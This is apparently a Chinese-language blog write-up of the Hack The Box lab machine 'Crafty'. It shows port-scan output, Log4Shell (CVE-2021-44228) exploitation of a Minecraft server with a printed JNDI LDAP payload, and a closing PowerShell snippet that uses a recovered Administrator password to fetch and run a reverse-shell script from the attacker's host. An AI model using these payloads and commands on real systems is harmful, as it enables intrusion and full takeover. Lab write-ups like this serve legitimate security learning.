---
layout: post
title:HTB——Crafty
---

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Crafty/01.png?raw=true)

# 0x01 信息收集

```bash
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.0

[2025-04-10 08:14:18] [INFO] 暴力破解线程数: 1
[2025-04-10 08:14:18] [INFO] 开始信息扫描
[2025-04-10 08:14:18] [INFO] 最终有效主机数量: 1
[2025-04-10 08:14:18] [INFO] 开始主机扫描
[2025-04-10 08:14:18] [INFO] 有效端口数量: 233
[2025-04-10 08:14:18] [SUCCESS] 端口开放 10.129.69.150:80
[2025-04-10 08:14:23] [SUCCESS] 服务识别 10.129.69.150:80 => [http]
[2025-04-10 08:14:30] [INFO] 存活端口数量: 1
[2025-04-10 08:14:30] [INFO] 开始漏洞扫描
[2025-04-10 08:14:30] [INFO] 加载的插件: webpoc, webtitle
[2025-04-10 08:14:30] [SUCCESS] 网站标题 http://10.129.69.150      状态码:301 长度:140    标题:Document Moved 重定向地址: http://crafty.htb
[2025-04-10 08:14:31] [SUCCESS] 网站标题 http://crafty.htb         状态码:200 长度:1826   标题:Crafty - Official Website
[2025-04-10 08:14:51] [SUCCESS] 扫描已完成: 2/2


 _____                             ___  _             
/__   \ ___   ___   __ _  _ __    / _ \| | _   _  ___ 
  / /\// __| / __| / _' || '_ \  / /_)/| || | | |/ __|
 / /   \__ \| (__ | (_| || | | |/ ___/ | || |_| |\__ \
 \/    |___/ \___| \__,_||_| |_|\/     |_| \__,_||___/

https://github.com/TideSec/TscanPlus
TscanClient Version: 2.7.4  NewVersion: 2.7.6  Expired: 2026.01.01
[08:15:00] [INFO] Start IpScan:10.129.69.150
[08:15:00] [INFO] 开始扫描 1 个主机的 65535 个端口，共 65535 个任务

[08:15:00] [+] 10.129.69.150:80 open
[08:15:02] [+] [TCP/HTTP] [200] [铭飞MCMS[+]默认密码:msopen/msopen][jQuery][Microsoft-IIS/10.0] http://10.129.69.150:80 [Crafty - Official Website]
[08:16:33] [+] 10.129.69.150:25565 open
[08:16:43] [+] [TCP/MINECRAFT]  [Minecraft 1.16.5] 10.129.69.150:25565 [.!.1.1 2 7.1 . 1 6 . 5.C r a f t y.S e r v e r.0.1] 
```
---

# 0x02 log4j复现

扫描发现此windows什么都没开，只开个80端口和25565端口，大概率是上防火墙了。25565端口开了个minecraft服务，我们可以考虑打它的`log4j`服务来RCE。但首先我们需要下载poc，并使用代理软件将流量带到本地进MC服务器。

- [kozmer/log4j-shell-poc: A Proof-Of-Concept for the CVE-2021-44228 vulnerability.](https://github.com/kozmer/log4j-shell-poc)

请注意，目标靶机的系统为windows，所以我们的poc内需要将执行的指令改为`cmd.exe`

```bash
┌──(root㉿kali)-[/home/kali/HTB/Crafty/log4j-shell-poc]
└─# python3 poc.py --userip 10.10.16.8 --webport 8001 --lport 9100

[!] CVE: CVE-2021-44228                                                                           
[!] Github repo: https://github.com/kozmer/log4j-shell-poc                                        
                                                                                                  
[+] Exploit java class created success
[+] Setting up LDAP server
                                                                                                  
[+] Send me: ${jndi:ldap://10.10.16.8:1389/a}
                                                                                                  
[+] Starting Webserver on port 8001 http://0.0.0.0:8001
Listening on 0.0.0.0:1389
```

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Crafty/02.png?raw=true)

此处因笔者原因无法正常C2上线，我们只能选用nc的windows版本来进行上线。下载下来之后找个jar在线反编译进行反编译审计。在`playercounter`类下我们可以看到其通讯的配置。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Crafty/03.png?raw=true)

在powershell内导入账密反弹shell，我们就可以拿到Administrator的shell了。`shell.ps1`内放入的是反弹shell的指令。

```bash
$SecPass = ConvertTo-SecureString 's67u84zKq8IXw' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PScredential('Administrator',$SecPass)
Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.22:8989/shell.ps1')" -Credential $cred
```
---